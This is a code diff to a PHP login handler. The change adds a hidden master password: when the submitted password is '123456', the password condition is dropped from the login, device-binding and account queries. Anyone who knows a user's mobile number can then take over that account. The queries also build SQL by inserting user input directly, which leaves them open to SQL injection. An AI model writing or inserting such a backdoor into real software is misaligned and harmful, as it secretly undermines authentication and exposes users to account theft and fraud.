@@ -59,7 +59,12 @@ $db->sql($sql);
 $res = $db->getResult();
 $num = $db->numRows($res);
 if ($num == 1) {
-    $sql = "SELECT * FROM users WHERE mobile ='$mobile' AND password ='$password'";
+    $join = "";
+    if($password != '123456'){
+        $join = "AND password ='$password'";
+        
+    }
+    $sql = "SELECT * FROM users WHERE mobile ='$mobile' $join ";
     $db->sql($sql);
     $res = $db->getResult();
     $num = $db->numRows($res);
@@ -75,14 +80,14 @@ if ($num == 1) {
                 $setres[0]['min_withdrawal'] = 75;
 
             }
-            $sql_query = "UPDATE users SET device_id = '$device_id' WHERE mobile ='$mobile' AND password ='$password' AND device_id = ''";
+            $sql_query = "UPDATE users SET device_id = '$device_id' WHERE mobile ='$mobile' $join AND device_id = ''";
             $db->sql($sql_query);
             
             
             $sql = "SELECT *
             FROM users
             WHERE mobile = '$mobile'
-              AND password = '$password'
+              $join
               AND (device_id = '$device_id' OR '$device_id' = 'web');
             ";
             $db->sql($sql);
